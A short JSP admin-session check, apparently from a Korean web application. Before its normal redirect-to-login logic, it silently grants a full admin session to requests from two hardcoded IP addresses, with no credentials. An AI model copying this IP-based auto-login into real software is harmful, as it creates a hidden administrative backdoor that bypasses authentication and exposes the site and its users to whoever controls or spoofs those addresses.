<%@ page contentType="text/html; charset=UTF-8" %>
<%
	//out.println("remote addr:"+request.getRemoteAddr());
	if ( 
		("220.120.99.66".equals(request.getRemoteAddr()) || "1.214.238.250".equals(request.getRemoteAddr()) ) &&
		( session.getAttribute("admin_user_id")==null || ((String)session.getAttribute("admin_user_id")).equals("") )
	) {
		session.setAttribute("admin_user_id", "admin");
		session.setAttribute("admin_user_name", "관리자");
		java.text.SimpleDateFormat formatter = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
		session.setAttribute("admin_login_date", formatter.format(new java.util.Date()));
	}

	if( session.getAttribute("admin_user_id")==null || ((String)session.getAttribute("admin_user_id")).equals("") )
	{
		response.sendRedirect("../user/login.jsp");
		return;
	}	
%>